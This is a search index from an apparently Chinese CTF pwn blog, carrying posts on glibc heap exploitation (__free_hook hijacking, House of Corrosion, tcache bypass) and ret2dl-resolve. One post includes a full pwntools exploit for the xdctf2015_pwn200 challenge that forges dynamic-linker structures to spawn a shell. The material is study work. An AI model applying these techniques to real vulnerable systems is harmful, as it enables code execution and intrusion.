<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>free_hook劫持(glibc2.26之前)</title>
      <link href="/2022/11/22/free-hook-jie-chi-glibc2.26-zhi-qian/"/>
      <url>/2022/11/22/free-hook-jie-chi-glibc2.26-zhi-qian/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做Full RELRO的堆题远程环境one_gadget总是无效,于是便来研究一下__free_hook劫持,加入tcache之后的__free_hook劫持比较容易，本文主要探讨glibc2.26之前的利用方法<br>要有其他方法(或是让one_gadget生效的方法)欢迎qq交流</p><h1 id="free-hook劫持原理"><a href="#free-hook劫持原理" class="headerlink" title="free_hook劫持原理"></a>free_hook劫持原理</h1><p>在调用free函数时，若__free_hook的值存在，便会先调用__free_hook指向的地址，于是可以将__free_hook的值改为system函数的地址，再free一个指向”/bin/sh\x00”的指针，便可达到system(“/bin/sh”)的效果</p><h1 id="free-hook劫持方法"><a href="#free-hook劫持方法" class="headerlink" title="free_hook劫持方法"></a>free_hook劫持方法</h1><p>不同于__malloc_hook和realloc_hook的劫持方法，由于free_hook上方一定区域内(<del>大概率?</del>)不存在能制造字节错位的条件(<del>有的话也超出了Fastbin的范围</del>)，于是直接通过<code>Fastbin Arbitrary Alloc</code>到__free_hook上方的方法基本失效<br>ps:补充一点,gdb.attach上去可以看到free_hook低地址处正好有个7f开头的地址，不过这个地址是__isoc99_scanf函数写上去的，函数执行完后便清零了(<del>血泪教训</del>)</p><h3 id="1-篡改top域"><a href="#1-篡改top域" class="headerlink" title="1.篡改top域"></a>1.篡改top域</h3><p>通过改写main_arena，篡改top域并将top chunk转移到__free_hook之前，便可通过分配chunk劫持__free_hook</p><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ol><li>前提是得能分配很大的chunk(分配很多次也行),因为实际上能伪造为top chunk的size域的地址离free__hook很远(glibc2.23这一偏移为0xb58)</li><li>攻击main_arena的top域也并非易事,malloc_hook-0x23(glibc2.23)处的字节错位得到的fake_chunk并不足以让你覆盖到top域(<del>有堆溢出就当我没说</del>)<br>  倒也有解决办法，虽然覆盖不了top域但可以覆盖fastbinsY数组,修改然后获得一个能覆盖到top域的chunk<br>(理论上是可行的，但实际过程遇到了很多高手情况,以后再回来复现吧…)</li></ol><h3 id="2-House-of-Corrosion"><a href="#2-House-of-Corrosion" class="headerlink" title="2.House of Corrosion"></a>2.House of Corrosion</h3><p>篡改global_max_fast为一个较大值(<code>Unsortedbin Attack</code>),然后计算__free_hook到FastbinY的偏移,再计算要伪造的bin的size</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">fastbin_ptr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main_arena'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">8</span>idx<span class="token operator">=</span><span class="token punctuation">(</span>target_addr<span class="token operator">-</span>fastbin_ptr<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span>size<span class="token operator">=</span>idx<span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x20</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>size计算简化之后是这样的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">chunk_size <span class="token operator">=</span> <span class="token punctuation">(</span>delta <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x20</span> ，delta为目标地址与fastbinY的offset<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后free掉对应size的chunk，更改其的fd指针为目标值(在这里就是system函数地址)，再将A分配回来便完成劫持<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202211221629378.png"></p><h3 id="3-制造字节错位"><a href="#3-制造字节错位" class="headerlink" title="3.制造字节错位"></a>3.制造字节错位</h3><p>不方便利用不就是因为没有字节错位吗？制造一个就好了<code>Unsortedbin Attack</code>在__free_hook上方写入unsortedbin地址(0x7f开头)，然后正常<code>Fastbin Arbitrary Alloc</code>劫持</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://aidaip.github.io/binary/2020/02/20/House-of-Corrosion.html">AiDai  House of Corrosion</a><br><a href="https://zhuanlan.zhihu.com/p/448880453">House of Corrosion 原理及利用</a><br><a href="https://ray-cp.github.io/archivers/heap_global_max_fast_exploit">堆中global_max_fast相关利用</a><br><a href="https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/">malloc_hook以及free_hook劫持原理</a><br><a href="https://lexsd6.github.io/2021/03/14/%E5%8A%AB%E6%8C%81hook%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(6)/">劫持hook函数</a></p>]]></content>
      
      
      <categories>
          
          <category> 探究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl-resolve(2)：64位利用及Full RELRO</title>
      <link href="/2022/11/18/ret2dl-resolve-2-64-wei-li-yong-ji-full-relro/"/>
      <url>/2022/11/18/ret2dl-resolve-2-64-wei-li-yong-ji-full-relro/</url>
      
        <content type="html"><![CDATA[<h1 id="64位ret2dl-resolve"><a href="#64位ret2dl-resolve" class="headerlink" title="64位ret2dl-resolve"></a>64位ret2dl-resolve</h1><h2 id="32位与64位差别"><a href="#32位与64位差别" class="headerlink" title="32位与64位差别"></a>32位与64位差别</h2><ol><li>相关结构体大小不同</li><li><code>_dl_runtime_resolve(link_map_obj, reloc_arg)</code>的参数reloc_arg在32位是地址偏移reloc_offset,在64位是reloc_index，含义是所重定位符号的重定位项在重定位表“.rel.plt”中的下标。重定位项地址reloc = JMPREL + reloc_index*3*8。</li><li>在这里直接引用<a href="https://sp4n9x.github.io/">Sp4n9x</a>师傅的一段话(<del>具体为啥会有问题我暂时也没理解到</del>)</li></ol><ul><li>64位情况下，bss节一般位于0x600000之后，重定位表“.rela.plt一般在0x400000左右，所以我们构造的r_info的高位(sym_index)和reloc_arg一般会很大。又因为计算符号项地址&amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]和符号版本项地址vernum[ELFW(R_SYM) (reloc-&gt;r_info)]时，数组的数据类型的大小不同(symtab中的结构体大小为0x18字节，vernum的数据类型为uint16_t，大小为0x2字节)，这就导致vernum[ELFW(R_SYM) (reloc-&gt;r_info)]大概率会访问到0x400000到0x600000之间的不可读区域(64位下，这个区间一般不可读)，使得程序报错。<pre class="line-numbers language-c" data-language="c"><code class="language-c">     <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-&gt;</span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span>    <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-&gt;</span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>  version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-&gt;</span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-&gt;</span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>所以我们要想办法进行绕过：(不绕过也是有很小几率成功的)</li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="方案一：使l-gt-l-info-VERSYMIDX-DT-VERSYM-x3D-x3D-NULL"><a href="#方案一：使l-gt-l-info-VERSYMIDX-DT-VERSYM-x3D-x3D-NULL" class="headerlink" title="方案一：使l->l_info[VERSYMIDX (DT_VERSYM)] == NULL"></a>方案一：使l-&gt;l_info[VERSYMIDX (DT_VERSYM)] == NULL</h3><p>l-&gt;l_info[VERSYMIDX (DT_VERSYM)] 的地址在64位是link_map+0x1c8,32位为link_map+0xe4<br>我们需要先泄露link_map地址，再将link_map+0x1c8设置成不为0。<br>之后就是和32位下的思路一样了，根据64位下的结构体伪造结构体，伪造reloc_arg来进行攻击。</p><h3 id="方案二：使sym-gt-st-other-x3D-x3D-0"><a href="#方案二：使sym-gt-st-other-x3D-x3D-0" class="headerlink" title="方案二：使sym->st_other== 0"></a>方案二：使sym-&gt;st_other== 0</h3><p>这应该是最普遍的做法吧<br>既然是绕过，干脆绕个大的，直接不进入最外层的判断</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span> <span class="token punctuation">(</span>sym<span class="token operator">-&gt;</span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>程序会把该函数判定为已解析过的函数，进入else语句中<br>else语句相当于将l-&gt;l_addr + sym-&gt;st_value的值存在value中,作为函数的真实地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token comment">/* We already found the symbol.  The module (and therefore its loadaddress) is also known.  */</span>    value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l<span class="token operator">-&gt;</span>l_addr <span class="token operator">+</span> sym<span class="token operator">-&gt;</span>st_value<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> l<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">DL_FIXUP_VALUE_TYPE value<span class="token punctuation">;</span>  <span class="token comment">//DL_FIXUP_VALUE_TYPE是fixup/profile_fixup返回值的类型。保存函数的真实地址。</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">lookup_t</span> result<span class="token punctuation">;</span>    <span class="token comment">//查找函数的结果，其为定义函数的共享对象的加载基地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们可以选择把 sym-&gt;st_value 伪造为某个已解析函数的got表地址,如read.got ，再把 l-&gt;l_addr 改为 目标地址如 system 到 read 的偏移。那么我们的 value 最后就是 system地址。<br>要实现以上利用，我们需要伪造位于link_map+0x70的DT_SYMTAB指针、link_map+0xf8的DT_JMPREL指针、link_map+0x68的DT_STRTAB指针。之后就是伪造.dynamic中的DT_SYMTAB结构体和DT_JMPREL结构体以及函数所对应的Elf64_Rela结构体。为了方便，我在构造的过程中一般将reloc_index作为0来进行构造。<br>总的来说要满足以下条件(回忆一下延迟绑定的过程便很好理解)</p><ul><li>1.link_map中的DT_STRTAB、DT_SYMTAB、DT_JMPREL可读  </li><li>2.DT_SYMTAB结构体中的d_ptr即sym，(*(sym+5))&amp;0x03 != 0  </li><li>3.(reloc-&gt;r_info)&amp;0xff == 7  </li><li>4.rel_addr = l-&gt;addr + reloc-&gt;r_offset即原先需要修改的got表地址有可写权限  </li><li>5.l-&gt;l_addr + sym-&gt;st_value 为system的地址</li></ul><h1 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><code>Full RELRO</code>：继承<code>Partial RELRO</code>的所有保护，并且.got.plt被标为只读。此时延迟绑定技术被禁止，所有的外部函数地址将在程序装载时解析、装入，并标记为只读，不可更改。此时不需要link_map以及dl_runtime_resolve函数，则GOT表中这两项数据均置为0.</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><code>.dynamic</code>段中的以<code>DT_DEBUG</code>符号为关键字的值，指向了一个叫做<code>r_debug</code>结构体,其中的<code>r_map</code>字段即我们需要的<code>link_map</code>的地址<br>而至于<code>dl_runtime_resolve</code>函数，则可以从别的已加载进程序内存的且没有开<code>FULL RELRO</code>保护的<code>elf</code>(libc.so)的<code>GOT</code>中寻找.<br>link_map结构体内存在<code>l_next</code>和<code>l_prev</code>两个结构体指针可以让我们遍历到所有已加载进来的<code>elf</code>文件的<code>link_map</code>,再通过读取link_map中的<code>l_info[DT_PLTGOT]</code>是否为0来判断是否开启Full RELRO保护</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>感谢师傅们的文章<br><a href="https://bbs.pediy.com/thread-253833.htm#msg_header_h2_2">dl_runtime_resolve结合源码分析及常见的几种攻击手法</a><br><a href="https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9">ret2_dl_runtime_resolve详解</a><br><a href="https://www.cnblogs.com/pwnfeifei/p/15701859.html">ret2dl_resolve</a><br><a href="https://ray-cp.github.io/archivers/ret2dl_resolve_analysis#64%E4%BD%8Delf%E7%A8%8B%E5%BA%8F%E7%9A%84ret2dl_resolve">ret2dl_resolve解析</a><br><a href="https://www.cnblogs.com/winmt/articles/15692475.html">ret2dlresolve 与 改写got表</a><br><a href="https://www.testzero-wz.com/2022/03/05/Ret2dlresolve%E2%80%94%E2%80%94%E4%BB%8ENo-RELRO%E5%88%B0FULL-RELRO/#%E4%B8%80.-ret2dlresolve%E5%8E%9F%E7%90%86">Ret2dlresolve攻击——从No RELRO到FULL RELRO</a></p>]]></content>
      
      
      <categories>
          
          <category> Stack Overflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl-resolve(1)：原理及基础利用</title>
      <link href="/2022/11/14/ret2dl-resolve-1-yuan-li-ji-32-wei-ji-chu-li-yong/"/>
      <url>/2022/11/14/ret2dl-resolve-1-yuan-li-ji-32-wei-ji-chu-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>ret2dl-resolve于2015年在论文_How the ELF Ruined Christmas_中被提出，作者是来自加州大学圣塔芭芭拉分校的Alessandro Di Federico等人。随着安全防御机制的不断完善，如今一个现代的漏洞利用通常包含两个阶段：</p><ol><li>通过信息泄露获得程序的内存布局</li><li>实际的漏洞利用</li></ol><p>然而，从程序中获得内存布局的方法并不总是可行的，且获得的被破坏的内存有时并不可靠。于是作者提出来ret2dl-resolve，巧妙地利用了ELF格式以及动态装载器的弱点，不需要进行信息泄露就可以直接标识关键函数的位置并调用。</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>如果之前没有理解动态链接的过程和相应的段、节等前置知识，理解ret2dl-resolve是有些困难的，在这里放下我学习时的资料：<br>完整动态链接过程：<a href="https://zhuanlan.zhihu.com/p/134105591">深入窥探动态链接</a>    <a href="https://www.jianshu.com/p/8dd91ec35dda">动态链接</a><br>相关的一些节、段的介绍：<a href="https://www.thinbug.com/q/53156275">https://www.thinbug.com/q/53156275</a><br>源码：<a href="https://man7.org/linux/man-pages/man5/elf.5.html">相关段、节源码</a></p><h1 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h1><p>动态链接比静态链接要灵活得多，但它是以牺牲一部分性能为代价的。为优化动态链接性能，ELF采用了一种 <strong><code>延迟绑定(Lazy Binding)</code></strong> 的做法。基本思想就是当函数第一次被用到时才进行绑定(符号查找、重定位等)<br>具体流程引用一位师傅的图片<img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A.png"><br>用通俗一点(<del>不太准确</del>)的话描述一下过程(<del>我的理解</del>): ELF是通过函数<code>_dl_runtime_resolve(link_map_obj, reloc_arg)</code>实现绑定的.<br>$\color{pink}{第一步}$，每个导入函数都在PLT表中有一个条目，当函数第一次被调用时,程序通过call指令执行到该函数(以read举例)的read@plt条目的第一条指令，read@plt表的第一指令为跳转到read@got条目，而因为read函数是第一次被调用，此时read@got条目中存的是read@plt条目第二条指令的位置，再跳转回来相当于就是顺序执行read@plt的指令.<br>$\color{pink}{第二步}$，read@plt条目的第二条指令是将导入函数的标识(Elf_Rel在.rel.plt段中的偏移,也就是参数中的reloc_index)压入栈中，然后跳转到PLT0执行<br>$\color{pink}{第三步}$，PLT0包含两条指令，先将GOT[1]的值(也就是<code>_dl_runtime_resolve)</code>函数的第一个参数link_map_obj)压入栈中，然后跳转到GOT[2]保存的地址处，即<code>_dl_runtime_resolve)</code>函数.<br>$\color{pink}{第四步}$，<code>_dl_runtime_resolve)</code>函数完成地址的绑定，大概逻辑是这样的：<br>先通过link_map获得重定位函数所在了 libary 的基地址及<code>.dynamic</code>的地址，也就获得了.dynamic节中存有的其他和绑定相关的节(.dynsym .dynstr .rela.plt)的地址。利用第二个参数reloc_arg及rela.plt可以得到read函数在.dynsym中的下标，进而得到read函数符号表项<code>Elf32_Sym</code>(<code>Elf64_Sym</code>)的指针，记作sym。.dynstr节的地址+sym-&gt;st_name得到”read\x00”这一字符串的地址，再将字符串地址作为参数利用<code>_dl_lookup_symbol_x</code>函数在动态库中遍历搜索得到函数地址，填入read@got条目内并调用。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><ol><li>关闭RELRO保护：即.dynamic段可写。动态装载器是通过.dynamic段来获取.dynstr节的地址，故可以通过改写.dynamic段相应DT_STRTAB来在任意地址伪造.dynstr节并欺骗动态装载器</li><li>开启Partial RELRO保护：通过伪造参数reloc_index可制造一个巨大的偏移，使得内存地址超出.rel.plt段来到.bss段，攻击者就可伪造fake_rel等结构欺骗动态装载器</li><li>Full RELRO: 详见(2)部分内容</li></ol><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_3.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_1.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_2.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 启动程序</span><span class="token comment"># io = remote('node4.buuoj.cn',26320)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bof'</span><span class="token punctuation">)</span><span class="token comment"># io = gdb.debug('./bof')</span>e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bof'</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF('./')</span><span class="token comment"># 源程序gadget</span>write_plt <span class="token operator">=</span> <span class="token number">0x80483C0</span>vuln <span class="token operator">=</span> <span class="token number">0x80484D6</span>bss_addr <span class="token operator">=</span> e<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>pop_ebp <span class="token operator">=</span> <span class="token number">0x804862b</span>leave_ret <span class="token operator">=</span> <span class="token number">0x8048445</span>pop_ebx_esi_edi_ebp <span class="token operator">=</span> <span class="token number">0x8048628</span><span class="token comment"># 程序中section地址</span>plt0 <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addrrel_plt <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rel.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addrdynsym <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynsym'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addrdynstr <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr<span class="token comment"># 伪造相应结构</span>stack_size <span class="token operator">=</span> <span class="token number">0x800</span>base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> stack_sizefake_dynsym_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">32</span>align <span class="token operator">=</span> <span class="token number">0x10</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fake_dynsym_addr<span class="token operator">-</span>dynsym<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">)</span>fake_dynsym_addr <span class="token operator">+=</span> alignfake_dynstr_addr <span class="token operator">=</span> fake_dynsym_addr<span class="token operator">+</span><span class="token number">16</span>st_name <span class="token operator">=</span> fake_dynstr_addr <span class="token operator">-</span> dynstrst_value <span class="token operator">=</span> <span class="token number">0</span>st_size <span class="token operator">=</span> <span class="token number">0</span>st_info <span class="token operator">=</span> <span class="token number">0x12</span><span class="token comment">#这个其实是由两部分组成，分别是前24字节的st_bind和后八字节的st_type</span>fake_dynsym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_value<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_size<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_info<span class="token punctuation">)</span>fake_rel_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">24</span>reloc_arg <span class="token operator">=</span> fake_rel_addr<span class="token operator">-</span>rel_pltr_sym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_dynsym_addr<span class="token operator">-</span>dynsym<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">0x10</span>r_type <span class="token operator">=</span> <span class="token number">0x7</span>r_info <span class="token operator">=</span> <span class="token punctuation">(</span>r_sym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>r_type<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span>r_offset <span class="token operator">=</span> e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>fake_rel <span class="token operator">=</span> p32<span class="token punctuation">(</span>r_offset<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>fake_dynstr <span class="token operator">=</span> <span class="token string">b'system\x00'</span><span class="token comment"># stack pivot</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload_migrate <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>pop_ebx_esi_edi_ebp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>base_stage<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>base_stage<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span>leave_ret<span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_migrate<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># ret2dl_resolve</span>binsh_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">80</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>plt0<span class="token punctuation">,</span>reloc_index<span class="token punctuation">,</span><span class="token string">'retn'</span><span class="token punctuation">,</span>binsh_addr<span class="token punctuation">,</span><span class="token string">'arg1'</span><span class="token punctuation">,</span><span class="token string">'arg2'</span><span class="token punctuation">,</span>fake_rel<span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span>align<span class="token punctuation">,</span>fake_dynsym<span class="token punctuation">,</span>fake_dynstr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">b'/bin/sh\x00'</span>payload <span class="token operator">+=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">b'a'</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>感谢师傅们的文章！<br>最最最详细(包括64位利用细节)：<a href="https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9">ret2_dl_runtime_resolve详解</a><br>最最最容易理解：<a href="https://zikh26.github.io/posts/ba418f23.html">关于ret2_dl_runtime_resolve的学习总结</a><br>以及CTF权威指南(Pwn篇)</p>]]></content>
      
      
      <categories>
          
          <category> Stack Overflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache机制绕过</title>
      <link href="/2022/11/10/tcache-ji-zhi-rao-guo/"/>
      <url>/2022/11/10/tcache-ji-zhi-rao-guo/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>Tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能。<br>对攻击者而言,Tcache的不安全机制为攻击者带来了大量新的漏洞利用方式，但同时也使先前的一些利用方法(如Unsortedbin Attak)等漏洞利用减弱甚至失效，并且在一些题中Tcache的利用会相当麻烦。故本文探究Tcache机制的绕过方法(glibc2.26-2.27)</p><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><h2 id="1-分配大小不在Tcache范围内的堆块"><a href="#1-分配大小不在Tcache范围内的堆块" class="headerlink" title="1.分配大小不在Tcache范围内的堆块"></a>1.分配大小不在Tcache范围内的堆块</h2><p>好像说了句废话，不过在某些题中还是有用的.<br>Tcache的chunk范围在0x410(1032)字节以内</p><h2 id="2-填满Tcache"><a href="#2-填满Tcache" class="headerlink" title="2.填满Tcache"></a>2.填满Tcache</h2><p>好像也是句废话<br>free某个tcache超过7次，也就是将存放在tcache结构体中的该范围bins的数量占满，后续free的堆块就会放到相应的bin中</p><h2 id="3-修改Tcache结构体中的counts域"><a href="#3-修改Tcache结构体中的counts域" class="headerlink" 